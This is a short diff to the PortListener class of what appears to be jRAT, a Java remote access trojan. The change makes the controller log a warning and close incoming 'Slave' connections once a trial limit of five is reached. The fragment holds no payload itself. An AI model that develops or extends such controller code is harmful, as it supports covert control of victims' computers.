@@ -8,6 +8,8 @@ import java.util.List;
 import pro.jrat.Main;
 import pro.jrat.Slave;
 import pro.jrat.common.crypto.EncryptionKey;
+import pro.jrat.exceptions.CloseException;
+import pro.jrat.ui.panels.PanelMainLog;
 import pro.jrat.ui.panels.PanelMainSockets;
 
 
@@ -60,12 +62,13 @@ public class PortListener implements Runnable {
 		try {
 			while (!server.isClosed()) {
 				Socket socket = server.accept();
+				
+				Slave slave = new Slave(this, socket);
 
 				if (Main.trial && Main.connections.size() >= 5) {
-					socket.close();
-				} else {
-					new Slave(this, socket);
-				}
+					slave.closeSocket(new CloseException("Maximum of 5 connections reached"));
+					PanelMainLog.instance.addEntry("Warning", slave, "Maximum of 5 connections reached");
+				}			
 			}
 		} catch (Exception ex) {
 			ex.printStackTrace();
